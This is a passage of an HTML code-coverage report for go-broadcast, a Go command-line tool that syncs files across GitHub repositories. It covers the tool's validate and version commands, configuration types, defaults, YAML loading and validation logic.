                if err := validateRepositoryAccessibility(context.Background(), cfg, logConfig, sourceOnly); err != nil </span><span class="cov8" title="1">{
                        output.Error(fmt.Sprintf("Repository accessibility check failed: %v", err))
                        // Don't return error - this is a warning, not a fatal error
                }</span>

                // Validate source file existence
                <span class="cov8" title="1">validateSourceFilesExist(context.Background(), cfg, logConfig)</span>
        } else<span class="cov8" title="1"> {
                output.Info("")
                output.Info("Remote validation: (skipped)")
                output.Info("  ‚ö† Repository accessibility check skipped")
                output.Info("  ‚ö† Source file existence check skipped")
        }</span>

        <span class="cov8" title="1">return nil</span>
}

// validateRepositoryAccessibility checks if source and target repositories are accessible via GitHub API
func validateRepositoryAccessibility(ctx context.Context, cfg *config.Config, logConfig *logging.LogConfig, sourceOnly bool) error <span class="cov8" title="1">{
        // Check for nil config to ensure panic behavior expected by tests
        if cfg == nil </span><span class="cov8" title="1">{
                panic("config cannot be nil")</span>
        }

        <span class="cov8" title="1">log := logrus.WithField("component", "validate-repos")

        // Try to create GitHub client
        ghClient, err := gh.NewClient(ctx, logrus.StandardLogger(), logConfig)
        if err != nil </span><span class="cov0" title="0">{
                if strings.Contains(err.Error(), "gh CLI not found") </span><span class="cov0" title="0">{
                        output.Error("  ‚úó GitHub CLI not found in PATH")
                        output.Info("    Install with: https://cli.github.com/")
                        return ErrGitHubCLIRequired
                }</span>
                <span class="cov0" title="0">if strings.Contains(err.Error(), "not authenticated") </span><span class="cov0" title="0">{
                        output.Error("  ‚úó GitHub authentication required")
                        output.Info("    Run: gh auth login")
                        return ErrGitHubAuthRequired
                }</span>
                <span class="cov0" title="0">return fmt.Errorf("failed to initialize GitHub client: %w", err)</span>
        }

        // Check source repository accessibility
        <span class="cov8" title="1">groups := cfg.Groups
        if len(groups) == 0 </span><span class="cov0" title="0">{
                output.Error("  ‚úó No configuration groups found")
                return ErrNoConfigGroups
        }</span>

        <span class="cov8" title="1">group := groups[0] // For compatibility with old format, work with first group
        log.WithField("repo", group.Source.Repo).Debug("Checking source repository accessibility")
        _, err = ghClient.GetBranch(ctx, group.Source.Repo, group.Source.Branch)
        if err != nil </span><span class="cov8" title="1">{
                if strings.Contains(err.Error(), "branch not found") </span><span class="cov8" title="1">{
                        output.Error(fmt.Sprintf("  ‚úó Source branch '%s' not found in %s", group.Source.Branch, group.Source.Repo))
                        return ErrSourceBranchNotFound
                }</span>
                <span class="cov0" title="0">if strings.Contains(err.Error(), "404") || strings.Contains(err.Error(), "Not Found") </span><span class="cov0" title="0">{
                        output.Error(fmt.Sprintf("  ‚úó Source repository '%s' not accessible", group.Source.Repo))
                        output.Info("    Check repository name and permissions")
                        return ErrSourceRepoNotFound
                }</span>
                <span class="cov0" title="0">output.Error(fmt.Sprintf("  ‚úó Failed to access source repository: %v", err))
                return fmt.Errorf("source repository check failed: %w", err)</span>
        }
        <span class="cov0" title="0">output.Success(fmt.Sprintf("  ‚úì Source repository accessible: %s (branch: %s)", group.Source.Repo, group.Source.Branch))

        // Skip target repository checks if sourceOnly flag is set
        if sourceOnly </span><span class="cov0" title="0">{
                output.Info("  ‚ö† Target repository checks skipped (--source-only)")
                return nil
        }</span>

        // Check target repositories accessibility
        <span class="cov0" title="0">for i, target := range group.Targets </span><span class="cov0" title="0">{
                log.WithFields(logrus.Fields{
                        "target_index": i,
                        "repo":         target.Repo,
                }).Debug("Checking target repository accessibility")

                // Try to get repository information (this will fail if repo doesn't exist or no access)
                _, err = ghClient.ListBranches(ctx, target.Repo)
                if err != nil </span><span class="cov0" title="0">{
                        if strings.Contains(err.Error(), "404") || strings.Contains(err.Error(), "Not Found") </span><span class="cov0" title="0">{
                                output.Error(fmt.Sprintf("  ‚úó Target repository '%s' not accessible", target.Repo))
                                output.Info("    Check repository name and permissions")
                                continue</span> // Don't fail validation, just warn
                        }
                        <span class="cov0" title="0">output.Error(fmt.Sprintf("  ‚úó Failed to access target repository '%s': %v", target.Repo, err))
                        continue</span> // Don't fail validation, just warn
                }
                <span class="cov0" title="0">output.Success(fmt.Sprintf("  ‚úì Target repository accessible: %s", target.Repo))</span>
        }

        <span class="cov0" title="0">return nil</span>
}

// displayGroupValidation displays validation results for group-based configuration
func displayGroupValidation(groups []config.Group) <span class="cov8" title="1">{
        output.Info(fmt.Sprintf("  Groups: %d configured", len(groups)))
        output.Info("")

        // Check for circular dependencies
        hasCircularDeps := false
        dependencyMap := make(map[string][]string)
        for _, group := range groups </span><span class="cov8" title="1">{
                dependencyMap[group.ID] = group.DependsOn
        }</span>

        // Simple circular dependency check (could be enhanced)
        <span class="cov8" title="1">for _, group := range groups </span><span class="cov8" title="1">{
                visited := make(map[string]bool)
                if checkCircularDependency(group.ID, dependencyMap, visited) </span><span class="cov8" title="1">{
                        hasCircularDeps = true
                        output.Error(fmt.Sprintf("  ‚úó Circular dependency detected for group: %s", group.ID))
                }</span>
        }

        <span class="cov8" title="1">if !hasCircularDeps </span><span class="cov8" title="1">{
                output.Success("  ‚úì No circular dependencies detected")
        }</span>

        // Display each group
        <span class="cov8" title="1">for i, group := range groups </span><span class="cov8" title="1">{
                output.Info(fmt.Sprintf("  Group %d: %s (%s)", i+1, group.Name, group.ID))
                output.Info(fmt.Sprintf("    Priority: %d", group.Priority))

                // Check if enabled
                if group.Enabled != nil &amp;&amp; !*group.Enabled </span><span class="cov0" title="0">{
                        output.Warn("    Status: Disabled")
                }</span> else<span class="cov8" title="1"> {
                        output.Success("    Status: Enabled")
                }</span>

                // Show dependencies
                <span class="cov8" title="1">if len(group.DependsOn) &gt; 0 </span><span class="cov8" title="1">{
                        output.Info(fmt.Sprintf("    Dependencies: %s", strings.Join(group.DependsOn, ", ")))
                }</span>

                // Show source
                <span class="cov8" title="1">output.Info(fmt.Sprintf("    Source: %s (branch: %s)", group.Source.Repo, group.Source.Branch))

                // Show targets count
                output.Info(fmt.Sprintf("    Targets: %d repositories", len(group.Targets)))

                // Check for module configurations
                moduleCount := 0
                for _, target := range group.Targets </span><span class="cov8" title="1">{
                        for _, dir := range target.Directories </span><span class="cov0" title="0">{
                                if dir.Module != nil </span><span class="cov0" title="0">{
                                        moduleCount++
                                }</span>
                        }
                }
                <span class="cov8" title="1">if moduleCount &gt; 0 </span><span class="cov0" title="0">{
                        output.Info(fmt.Sprintf("    Modules: %d configured", moduleCount))
                }</span>

                <span class="cov8" title="1">output.Info("")</span>
        }

        // Validate priority uniqueness
        <span class="cov8" title="1">priorities := make(map[int][]string)
        for _, group := range groups </span><span class="cov8" title="1">{
                priorities[group.Priority] = append(priorities[group.Priority], group.ID)
        }</span>

        <span class="cov8" title="1">hasPriorityConflict := false
        for priority, ids := range priorities </span><span class="cov8" title="1">{
                if len(ids) &gt; 1 </span><span class="cov0" title="0">{
                        hasPriorityConflict = true
                        output.Warn(fmt.Sprintf("  ‚ö† Groups with same priority %d: %s", priority, strings.Join(ids, ", ")))
                }</span>
        }

        <span class="cov8" title="1">if !hasPriorityConflict </span><span class="cov8" title="1">{
                output.Success("  ‚úì All groups have unique priorities")
        }</span>
}

// checkCircularDependency checks for circular dependencies in group dependencies
func checkCircularDependency(groupID string, dependencyMap map[string][]string, visited map[string]bool) bool <span class="cov8" title="1">{
        if visited[groupID] </span><span class="cov8" title="1">{
                return true // Circular dependency detected
        }</span>

        <span class="cov8" title="1">visited[groupID] = true

        for _, depID := range dependencyMap[groupID] </span><span class="cov8" title="1">{
                if checkCircularDependency(depID, dependencyMap, visited) </span><span class="cov8" title="1">{
                        return true
                }</span>
        }

        <span class="cov8" title="1">delete(visited, groupID) // Backtrack
        return false</span>
}

// validateSourceFilesExist checks if all configured source files exist in the source repository
func validateSourceFilesExist(ctx context.Context, cfg *config.Config, logConfig *logging.LogConfig) <span class="cov8" title="1">{
        log := logrus.WithField("component", "validate-files")

        // Initialize GitHub client (reuse from previous function, but handle errors gracefully)
        ghClient, err := gh.NewClient(ctx, logrus.StandardLogger(), logConfig)
        if err != nil </span><span class="cov0" title="0">{
                output.Info("  ‚ö† Skipping source file validation (GitHub client unavailable)")
                return // Don't fail if client can't be created
        }</span>

        // Collect all unique source files across all targets
        <span class="cov8" title="1">sourceFiles := make(map[string]bool)
        groups := cfg.Groups
        if len(groups) == 0 </span><span class="cov0" title="0">{
                output.Info("  ‚ö† No configuration groups found")
                return
        }</span>
        <span class="cov8" title="1">group := groups[0] // For compatibility with old format, work with first group
        for _, target := range group.Targets </span><span class="cov8" title="1">{
                for _, file := range target.Files </span><span class="cov8" title="1">{
                        sourceFiles[file.Src] = true
                }</span>
        }

        <span class="cov8" title="1">if len(sourceFiles) == 0 </span><span class="cov8" title="1">{
                output.Info("  ‚ö† No source files to validate")
                return
        }</span>

        // Check each source file exists
        <span class="cov8" title="1">filesChecked := 0
        filesFound := 0
        for srcPath := range sourceFiles </span><span class="cov8" title="1">{
                log.WithFields(logrus.Fields{
                        "source_file": srcPath,
                        "repo":        group.Source.Repo,
                        "branch":      group.Source.Branch,
                }).Debug("Checking source file existence")

                _, err := ghClient.GetFile(ctx, group.Source.Repo, srcPath, group.Source.Branch)
                filesChecked++
                if err != nil </span><span class="cov8" title="1">{
                        if strings.Contains(err.Error(), "file not found") </span><span class="cov8" title="1">{
                                output.Error(fmt.Sprintf("  ‚úó Source file not found: %s", srcPath))
                                continue</span> // Don't fail validation, just warn
                        }
                        <span class="cov0" title="0">output.Error(fmt.Sprintf("  ‚úó Failed to check source file '%s': %v", srcPath, err))
                        continue</span> // Don't fail validation, just warn
                }
                <span class="cov0" title="0">filesFound++</span>
        }

        <span class="cov8" title="1">if filesFound == filesChecked </span><span class="cov0" title="0">{
                output.Success(fmt.Sprintf("  ‚úì All source files exist (%d/%d)", filesFound, filesChecked))
        }</span> else<span class="cov8" title="1"> {
                output.Error(fmt.Sprintf("  ‚ö† Some source files missing (%d/%d found)", filesFound, filesChecked))
        }</span>
}

//nolint:gochecknoinits // Cobra commands require init() for flag registration
func init() <span class="cov8" title="1">{
        validateCmd.Flags().Bool("skip-remote-checks", false, "Skip GitHub and Git repository checks (offline validation)")
        validateCmd.Flags().Bool("source-only", false, "Only validate source repository access (skip target repositories)")
}</span>
</pre>

		<pre class="file" id="file18" style="display: none">package cli

import (
        "encoding/json"
        "fmt"
        "runtime"

        "github.com/spf13/cobra"

        "github.com/mrz1836/go-broadcast/internal/output"
)

// Build information set via ldflags
//
//nolint:gochecknoglobals // Build variables are set via ldflags during compilation
var (
        version   = "dev"
        commit    = "unknown"
        buildDate = "unknown"
)

// VersionInfo contains version information
type VersionInfo struct {
        Version   string `json:"version"`
        Commit    string `json:"commit"`
        BuildDate string `json:"build_date"`
        GoVersion string `json:"go_version"`
        OS        string `json:"os"`
        Arch      string `json:"arch"`
}

// initVersion initializes version command flags
func initVersion() <span class="cov8" title="1">{
        versionCmd.Flags().BoolVar(&amp;jsonOutput, "json", false, "Output version in JSON format")
}</span>

//nolint:gochecknoglobals // Cobra commands are designed to be global variables
var versionCmd = &amp;cobra.Command{
        Use:   "version",
        Short: "Show version information",
        Long:  `Display version information including commit hash, build date, and platform details.`,
        Example: `  # Show version information
  go-broadcast version

  # Output in JSON format
  go-broadcast version --json`,
        RunE: runVersion,
}

func runVersion(_ *cobra.Command, _ []string) error <span class="cov8" title="1">{
        info := VersionInfo{
                Version:   version,
                Commit:    commit,
                BuildDate: buildDate,
                GoVersion: runtime.Version(),
                OS:        runtime.GOOS,
                Arch:      runtime.GOARCH,
        }

        if jsonOutput </span><span class="cov8" title="1">{
                encoder := json.NewEncoder(output.Stdout())
                encoder.SetIndent("", "  ")
                return encoder.Encode(info)
        }</span>

        // Text output
        <span class="cov8" title="1">output.Info(fmt.Sprintf("go-broadcast %s", info.Version))
        output.Info(fmt.Sprintf("Commit:     %s", info.Commit))
        output.Info(fmt.Sprintf("Build Date: %s", info.BuildDate))
        output.Info(fmt.Sprintf("Go Version: %s", info.GoVersion))
        output.Info(fmt.Sprintf("Platform:   %s/%s", info.OS, info.Arch))

        return nil</span>
}

// SetVersionInfo allows setting version information programmatically
// This is useful for testing or when not using ldflags
func SetVersionInfo(v, c, d string) <span class="cov8" title="1">{
        if v != "" </span><span class="cov8" title="1">{
                version = v
        }</span>
        <span class="cov8" title="1">if c != "" </span><span class="cov8" title="1">{
                commit = c
        }</span>
        <span class="cov8" title="1">if d != "" </span><span class="cov8" title="1">{
                buildDate = d
        }</span>
}
</pre>

		<pre class="file" id="file19" style="display: none">package config

// DefaultExclusions returns smart default exclusions for development artifacts
func DefaultExclusions() []string <span class="cov8" title="1">{
        return []string{
                "*.out",        // Coverage outputs
                "*.test",       // Go test binaries
                "*.exe",        // Windows executables
                "**/.DS_Store", // macOS files
                "**/tmp/*",     // Temporary files
                "**/.git",      // Git directories
        }
}</span>

// ApplyDirectoryDefaults applies default values to directory mappings
func ApplyDirectoryDefaults(dm *DirectoryMapping) <span class="cov8" title="1">{
        if dm.Exclude == nil </span><span class="cov8" title="1">{
                dm.Exclude = DefaultExclusions()
        }</span>
        // Set default values for boolean pointers if not explicitly set
        <span class="cov8" title="1">if dm.PreserveStructure == nil </span><span class="cov8" title="1">{
                preserveStructure := true
                dm.PreserveStructure = &amp;preserveStructure
        }</span>
        <span class="cov8" title="1">if dm.IncludeHidden == nil </span><span class="cov8" title="1">{
                includeHidden := true
                dm.IncludeHidden = &amp;includeHidden
        }</span>
}
</pre>

		<pre class="file" id="file20" style="display: none">package config

import (
        "fmt"
        "io"
        "os"

        "gopkg.in/yaml.v3"

        "github.com/mrz1836/go-broadcast/internal/logging"
)

// Load reads and parses a configuration file from the given path
func Load(path string) (*Config, error) <span class="cov8" title="1">{
        // Initialize audit logger for security event tracking
        auditLogger := logging.NewAuditLogger()

        file, err := os.Open(path) //#nosec G304 -- Path is user-provided config file
        if err != nil </span><span class="cov8" title="1">{
                // Log failed configuration access
                auditLogger.LogConfigChange("system", "config_load_failed", path)
                return nil, fmt.Errorf("failed to open config file: %w", err)
        }</span>

        <span class="cov8" title="1">defer func() </span><span class="cov8" title="1">{ _ = file.Close() }</span>()

        <span class="cov8" title="1">config, parseErr := LoadFromReader(file)
        if parseErr != nil </span><span class="cov8" title="1">{
                // Log failed configuration parsing
                auditLogger.LogConfigChange("system", "config_parse_failed", path)
                return nil, parseErr
        }</span>

        // Log successful configuration loading
        <span class="cov8" title="1">auditLogger.LogConfigChange("system", "config_loaded", path)

        return config, nil</span>
}

// LoadFromReader parses configuration from an io.Reader
func LoadFromReader(reader io.Reader) (*Config, error) <span class="cov8" title="1">{
        config := &amp;Config{}

        decoder := yaml.NewDecoder(reader)
        decoder.KnownFields(true) // Strict parsing - fail on unknown fields

        if err := decoder.Decode(config); err != nil </span><span class="cov8" title="1">{
                return nil, fmt.Errorf("failed to parse YAML: %w", err)
        }</span>

        // Apply defaults
        <span class="cov8" title="1">applyDefaults(config)

        return config, nil</span>
}

// applyDefaults sets default values for optional fields in group-based configuration
func applyDefaults(config *Config) <span class="cov8" title="1">{
        // Apply defaults to all groups
        for i := range config.Groups </span><span class="cov8" title="1">{
                group := &amp;config.Groups[i]

                // Set default source branch if not specified
                if group.Source.Branch == "" </span><span class="cov8" title="1">{
                        group.Source.Branch = "main"
                }</span>

                // Set default branch prefix if not specified
                <span class="cov8" title="1">if group.Defaults.BranchPrefix == "" </span><span class="cov8" title="1">{
                        group.Defaults.BranchPrefix = "chore/sync-files"
                }</span>

                // Set default PR labels if not specified
                <span class="cov8" title="1">if len(group.Defaults.PRLabels) == 0 </span><span class="cov8" title="1">{
                        group.Defaults.PRLabels = []string{"automated-sync"}
                }</span>

                // Set default enabled state if not specified
                <span class="cov8" title="1">if group.Enabled == nil </span><span class="cov8" title="1">{
                        group.Enabled = boolPtr(true)
                }</span>

                // Apply directory defaults to group targets
                <span class="cov8" title="1">for j := range group.Targets </span><span class="cov8" title="1">{
                        for k := range group.Targets[j].Directories </span><span class="cov8" title="1">{
                                ApplyDirectoryDefaults(&amp;group.Targets[j].Directories[k])
                        }</span>
                }
        }
}
</pre>

		<pre class="file" id="file21" style="display: none">package config

// Config represents the complete sync configuration
type Config struct {
        Version int     `yaml:"version"`        // Config version (1)
        Name    string  `yaml:"name,omitempty"` // Optional config name
        ID      string  `yaml:"id,omitempty"`   // Optional config ID
        Groups  []Group `yaml:"groups"`         // List of sync groups
}

// SourceConfig defines the source repository settings
type SourceConfig struct {
        Repo   string `yaml:"repo"`   // Format: org/repo
        Branch string `yaml:"branch"` // Default: master
}

// GlobalConfig contains global settings applied across all targets
// These settings are merged with target-specific settings rather than overridden
type GlobalConfig struct {
        PRLabels        []string `yaml:"pr_labels,omitempty"`         // Global PR labels to apply to all PRs
        PRAssignees     []string `yaml:"pr_assignees,omitempty"`      // Global GitHub usernames to assign to all PRs
        PRReviewers     []string `yaml:"pr_reviewers,omitempty"`      // Global GitHub usernames to request reviews from
        PRTeamReviewers []string `yaml:"pr_team_reviewers,omitempty"` // Global GitHub team slugs to request reviews from
}

// DefaultConfig contains default settings applied to all targets
type DefaultConfig struct {
        BranchPrefix    string   `yaml:"branch_prefix,omitempty"`     // Default: chore/sync-files
        PRLabels        []string `yaml:"pr_labels,omitempty"`         // Default: ["automated-sync"]
        PRAssignees     []string `yaml:"pr_assignees,omitempty"`      // GitHub usernames to assign to PRs
        PRReviewers     []string `yaml:"pr_reviewers,omitempty"`      // GitHub usernames to request reviews from
        PRTeamReviewers []string `yaml:"pr_team_reviewers,omitempty"` // GitHub team slugs to request reviews from
}

// TargetConfig defines a target repository and its file mappings
type TargetConfig struct {
        Repo            string             `yaml:"repo"`                        // Format: org/repo
        Files           []FileMapping      `yaml:"files"`                       // Files to sync
        Directories     []DirectoryMapping `yaml:"directories,omitempty"`       // Directories to sync
        Transform       Transform          `yaml:"transform,omitempty"`         // Optional transformations
        PRLabels        []string           `yaml:"pr_labels,omitempty"`         // Override default PR labels
        PRAssignees     []string           `yaml:"pr_assignees,omitempty"`      // Override default PR assignees
        PRReviewers     []string           `yaml:"pr_reviewers,omitempty"`      // Override default PR reviewers
        PRTeamReviewers []string           `yaml:"pr_team_reviewers,omitempty"` // Override default PR team reviewers
}

// FileMapping defines source to destination file mapping
type FileMapping struct {
        Src  string `yaml:"src"`  // Source file path
        Dest string `yaml:"dest"` // Destination file path
}

// DirectoryMapping defines source to destination directory mapping
type DirectoryMapping struct {
        Src               string        `yaml:"src"`                          // Source directory path
        Dest              string        `yaml:"dest"`                         // Destination directory path
        Exclude           []string      `yaml:"exclude,omitempty"`            // Glob patterns to exclude
        IncludeOnly       []string      `yaml:"include_only,omitempty"`       // Glob patterns to include (excludes everything else)
        Transform         Transform     `yaml:"transform,omitempty"`          // Apply to all files
        PreserveStructure *bool         `yaml:"preserve_structure,omitempty"` // Keep nested structure (default: true)
        IncludeHidden     *bool         `yaml:"include_hidden,omitempty"`     // Include hidden files (default: true)
        Module            *ModuleConfig `yaml:"module,omitempty"`             // Module-aware sync settings
}

// Transform defines transformation settings
type Transform struct {
        RepoName  bool              `yaml:"repo_name,omitempty"` // Replace repository names
        Variables map[string]string `yaml:"variables,omitempty"` // Template variables
}

// Group represents a sync group with its own source and targets
type Group struct {
        Name        string         `yaml:"name"`                  // Friendly name
        ID          string         `yaml:"id"`                    // Unique identifier
        Description string         `yaml:"description,omitempty"` // Optional description
        Priority    int            `yaml:"priority,omitempty"`    // Execution order (default: 0)
        DependsOn   []string       `yaml:"depends_on,omitempty"`  // Group IDs this group depends on
        Enabled     *bool          `yaml:"enabled,omitempty"`     // Toggle on/off (default: true)
        Source      SourceConfig   `yaml:"source"`                // Source repository
        Global      GlobalConfig   `yaml:"global,omitempty"`      // Group-level globals
        Defaults    DefaultConfig  `yaml:"defaults,omitempty"`    // Group-level defaults
        Targets     []TargetConfig `yaml:"targets"`               // Target repositories
}

// ModuleConfig defines module-aware sync settings
type ModuleConfig struct {
        Type       string `yaml:"type,omitempty"`        // Module type: "go" (future: "npm", "python")
        Version    string `yaml:"version"`               // Version constraint (exact, latest, or semver)
        CheckTags  *bool  `yaml:"check_tags,omitempty"`  // Use git tags for versions (default: true)
        UpdateRefs bool   `yaml:"update_refs,omitempty"` // Update go.mod references
}

// boolPtr is a helper function to create a pointer to a boolean value.
// This is used for optional boolean fields with default values.
func boolPtr(b bool) *bool <span class="cov8" title="1">{
        return &amp;b
}</span>
</pre>

		<pre class="file" id="file22" style="display: none">package config

import (
        "context"
        "errors"
        "fmt"
        "path/filepath"
        "strings"
        "time"

        "github.com/sirupsen/logrus"

        "github.com/mrz1836/go-broadcast/internal/logging"
        "github.com/mrz1836/go-broadcast/internal/validation"
)

var (
        // ErrUnsupportedVersion indicates the configuration version is not supported
        ErrUnsupportedVersion = errors.New("unsupported config version")
        // ErrNoTargets indicates no target repositories were specified
        ErrNoTargets = errors.New("at least one target repository must be specified")
        // ErrDuplicateTarget indicates a target repository is specified multiple times
        ErrDuplicateTarget = errors.New("duplicate target repository")
        // ErrNoMappings indicates no file or directory mappings were specified
        ErrNoMappings = errors.New("at least one file or directory mapping is required")
        // ErrEmptySourcePath indicates a directory source path is empty
        ErrEmptySourcePath = errors.New("source path cannot be empty")
        // ErrEmptyDestPath indicates a directory destination path is empty
        ErrEmptyDestPath = errors.New("destination path cannot be empty")
        // ErrPathTraversal indicates path traversal is not allowed
        ErrPathTraversal = errors.New("path traversal not allowed")
        // ErrGroupNameEmpty indicates group name is empty
        ErrGroupNameEmpty = errors.New("group name cannot be empty")
        // ErrGroupIDEmpty indicates group ID is empty
        ErrGroupIDEmpty = errors.New("group id cannot be empty")
        // ErrDuplicateDestPath indicates destination path is used by multiple mappings
        ErrDuplicateDestPath = errors.New("destination path already in use")
)

// Validate checks if the configuration is valid
func (c *Config) Validate() error <span class="cov8" title="1">{
        return c.ValidateWithLogging(context.Background(), nil)
}</span>

// ValidateWithLogging checks if the configuration is valid with comprehensive debug logging support.
//
// This method provides detailed visibility into configuration validation when debug logging is enabled,
// including step-by-step validation progress, warnings for potential issues, and detailed error context.
//
// Parameters:
// - ctx: Context for cancellation control
// - logConfig: Configuration for debug logging and verbose settings
//
// Returns:
// - Error if validation fails
//
// Side Effects:
// - Logs detailed validation progress when --debug-config flag is enabled
// - Records validation timing and warning information
func (c *Config) ValidateWithLogging(ctx context.Context, logConfig *logging.LogConfig) error <span class="cov8" title="1">{
        logger := logging.WithStandardFields(logrus.StandardLogger(), logConfig, logging.ComponentNames.Config)
        start := time.Now()

        // Debug logging when --debug-config flag is enabled
        if logConfig != nil &amp;&amp; logConfig.Debug.Config </span><span class="cov0" title="0">{
                logger.WithFields(logrus.Fields{
                        logging.StandardFields.Operation: logging.OperationTypes.ConfigValidate,
                        "version":                        c.Version,
                        "group_count":                    len(c.Groups),
                }).Debug("Starting configuration validation")
        }</span>

        // Check for context cancellation
        <span class="cov8" title="1">select </span>{
        case &lt;-ctx.Done():<span class="cov0" title="0">
                return fmt.Errorf("validation canceled: %w", ctx.Err())</span>
        default:<span class="cov8" title="1"></span>
        }

        // Validate version
        <span class="cov8" title="1">if logConfig != nil &amp;&amp; logConfig.Debug.Config </span><span class="cov0" title="0">{
                logger.WithField("version", c.Version).Trace("Validating configuration version")
        }</span>

        <span class="cov8" title="1">if c.Version != 1 </span><span class="cov8" title="1">{
                if logConfig != nil &amp;&amp; logConfig.Debug.Config </span><span class="cov0" title="0">{
                        logger.WithFields(logrus.Fields{
                                "expected":                       1,
                                "actual":                         c.Version,
                                logging.StandardFields.ErrorType: "unsupported_version",
                        }).Error("Unsupported configuration version")
                }</span>
                <span class="cov8" title="1">return fmt.Errorf("%w: %d (only version 1 is supported)", ErrUnsupportedVersion, c.Version)</span>
        }

        // Validate groups
        <span class="cov8" title="1">if len(c.Groups) == 0 </span><span class="cov8" title="1">{
                if logConfig != nil &amp;&amp; logConfig.Debug.Config </span><span class="cov0" title="0">{
                        logger.Error("No groups specified")
                }</span>
                <span class="cov8" title="1">return ErrNoTargets</span>
        }

        // Validate all groups
        <span class="cov8" title="1">for i, group := range c.Groups </span><span class="cov8" title="1">{
                // Check for context cancellation
                select </span>{
                case &lt;-ctx.Done():<span class="cov0" title="0">
                        return fmt.Errorf("validation canceled: %w", ctx.Err())</span>
                default:<span class="cov8" title="1"></span>
                }

                // Validate group name and ID
                <span class="cov8" title="1">if group.Name == "" </span><span class="cov0" title="0">{
                        return fmt.Errorf("group[%d]: %w", i, ErrGroupNameEmpty)
                }</span>
                <span class="cov8" title="1">if group.ID == "" </span><span class="cov0" title="0">{
                        return fmt.Errorf("group[%d]: %w", i, ErrGroupIDEmpty)
                }</span>

                // Validate source
                <span class="cov8" title="1">if logConfig != nil &amp;&amp; logConfig.Debug.Config </span><span class="cov0" title="0">{
                        logger.WithFields(logrus.Fields{
                                "group_index": i,
                                "group_name":  group.Name,
                                "group_id":    group.ID,
                        }).Debug("Validating group source configuration")
                }</span>

                <span class="cov8" title="1">if err := c.validateGroupSourceWithLogging(ctx, logConfig, group); err != nil </span><span class="cov8" title="1">{
                        return fmt.Errorf("invalid group[%d] (%s) source configuration: %w", i, group.Name, err)
                }</span>

                // Validate global
                <span class="cov8" title="1">if logConfig != nil &amp;&amp; logConfig.Debug.Config </span><span class="cov0" title="0">{
                        logger.WithFields(logrus.Fields{
                                "group_index": i,
                                "group_name":  group.Name,
                        }).Debug("Validating group global configuration")
                }</span>

                <span class="cov8" title="1">if err := c.validateGroupGlobalWithLogging(ctx, logConfig, group); err != nil </span><span class="cov0" title="0">{
                        return fmt.Errorf("invalid group[%d] (%s) global configuration: %w", i, group.Name, err)
                }</span>

                // Validate defaults
                <span class="cov8" title="1">if logConfig != nil &amp;&amp; logConfig.Debug.Config </span><span class="cov0" title="0">{
                        logger.WithFields(logrus.Fields{
                                "group_index": i,
                                "group_name":  group.Name,
                        }).Debug("Validating group defaults configuration")
                }</span>

                <span class="cov8" title="1">if err := c.validateGroupDefaultsWithLogging(ctx, logConfig, group); err != nil </span><span class="cov8" title="1">{
                        return fmt.Errorf("invalid group[%d] (%s) defaults configuration: %w", i, group.Name, err)
                }</span>

                // Validate targets
                <span class="cov8" title="1">if len(group.Targets) == 0 </span><span class="cov8" title="1">{
                        if logConfig != nil &amp;&amp; logConfig.Debug.Config </span><span class="cov0" title="0">{
                                logger.WithFields(logrus.Fields{
                                        "group_index": i,
                                        "group_name":  group.Name,
                                }).Error("No target repositories specified in group")
                        }</span>
                        <span class="cov8" title="1">return fmt.Errorf("group[%d] (%s): %w", i, group.Name, ErrNoTargets)</span>
                }

                <span class="cov8" title="1">if logConfig != nil &amp;&amp; logConfig.Debug.Config </span><span class="cov0" title="0">{
                        logger.WithFields(logrus.Fields{
                                "group_index":                      i,
                                "group_name":                       group.Name,
                                logging.StandardFields.TargetCount: len(group.Targets),
                        }).Debug("Validating group target repositories")
                }</span>

                <span class="cov8" title="1">for j, target := range group.Targets </span><span class="cov8" title="1">{
                        // Check for context cancellation
                        select </span>{
                        case &lt;-ctx.Done():<span class="cov0" title="0">
                                return fmt.Errorf("validation canceled: %w", ctx.Err())</span>
                        default:<span class="cov8" title="1"></span>
                        }

                        <span class="cov8" title="1">targetLogger := logger
                        if logConfig != nil &amp;&amp; logConfig.Debug.Config </span><span class="cov0" title="0">{
                                targetLogger = logger.WithFields(logrus.Fields{
                                        "group_index":                     i,
                                        "group_name":                      group.Name,
                                        "target_index":                    j,
                                        logging.StandardFields.TargetRepo: target.Repo,
                                })
                                targetLogger.Trace("Validating target repository")
                        }</span>

                        <span class="cov8" title="1">if err := target.validateWithLogging(ctx, logConfig, targetLogger); err != nil </span><span class="cov8" title="1">{
                                return fmt.Errorf("invalid group[%d] (%s) target[%d] configuration: %w", i, group.Name, j, err)
                        }</span>
                }

                // Check for duplicate target repositories in group
                <span class="cov8" title="1">if logConfig != nil &amp;&amp; logConfig.Debug.Config </span><span class="cov0" title="0">{
                        logger.WithFields(logrus.Fields{
                                "group_index": i,
                                "group_name":  group.Name,
                        }).Debug("Checking for duplicate target repositories in group")
                }</span>

                <span class="cov8" title="1">seen := make(map[string]bool)
                for _, target := range group.Targets </span><span class="cov8" title="1">{
                        if seen[target.Repo] </span><span class="cov8" title="1">{
                                if logConfig != nil &amp;&amp; logConfig.Debug.Config </span><span class="cov0" title="0">{
                                        logger.WithFields(logrus.Fields{
                                                "group_index":                    i,
                                                "group_name":                     group.Name,
                                                "duplicate_repo":                 target.Repo,
                                                logging.StandardFields.ErrorType: "duplicate_target",
                                        }).Error("Duplicate target repository found in group")
                                }</span>
                                <span class="cov8" title="1">return fmt.Errorf("group[%d] (%s): %w: %s", i, group.Name, ErrDuplicateTarget, target.Repo)</span>
                        }

                        <span class="cov8" title="1">seen[target.Repo] = true</span>
                }
        }

        // Log successful validation completion
        <span class="cov8" title="1">duration := time.Since(start)
        if logConfig != nil &amp;&amp; logConfig.Debug.Config </span><span class="cov0" title="0">{
                totalTargets := 0
                for _, group := range c.Groups </span><span class="cov0" title="0">{
                        totalTargets += len(group.Targets)
                }</span>

                <span class="cov0" title="0">logger.WithFields(logrus.Fields{
                        logging.StandardFields.DurationMs: duration.Milliseconds(),
                        "groups_valid":                    len(c.Groups),
                        "targets_valid":                   totalTargets,
                        logging.StandardFields.Status:     "completed",
                }).Debug("Configuration validation completed successfully")</span>
        }

        <span class="cov8" title="1">return nil</span>
}

// validateGroupSourceWithLogging validates group source configuration with debug logging support.
func (c *Config) validateGroupSourceWithLogging(ctx context.Context, logConfig *logging.LogConfig, group Group) error <span class="cov8" title="1">{
        logger := logging.WithStandardFields(logrus.StandardLogger(), logConfig, "config-group-source")

        if logConfig != nil &amp;&amp; logConfig.Debug.Config </span><span class="cov0" title="0">{
                logger.WithFields(logrus.Fields{
                        logging.StandardFields.RepoName:   group.Source.Repo,
